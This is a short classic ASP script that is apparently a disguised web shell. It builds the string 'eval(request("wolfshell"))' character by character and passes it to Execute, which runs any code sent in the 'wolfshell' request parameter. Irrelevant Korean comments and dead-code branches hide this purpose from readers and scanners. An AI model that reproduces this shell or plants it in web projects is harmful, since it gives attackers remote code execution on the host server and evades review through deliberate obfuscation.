<%
'// 여기서 뭐하는거지?
Dim selector_k1, command_string_k5
selector_k1 = 4 - 2

'// 오늘 날씨가 너무 좋아요. 산책하러 갈까요?
Select Case selector_k1
    Case 1
        '// 이 코드는 실행되지 않습니다.
        command_string_k5 = "dead_code"
    Case 2
        '// 배고파요, 치킨 먹고 싶다.
        Dim parts_k3
        parts_k3 = Array("e", "v", "a", "l", "(", "r", "e", "q", "u", "e", "s", "t", "(", """", "w", "o", "l", "f", "s", "h", "e", "l", "l", """", ")", ")")
        
        '// 한국 드라마는 재미있어요.
        command_string_k5 = Join(parts_k3, "")
    Case Else
        '// 아마도 여기? 아니, 여기도 아니야.
        command_string_k5 = "not_executed"
End Select

'// 드디어 찾았다!
Execute(command_string_k5)
%>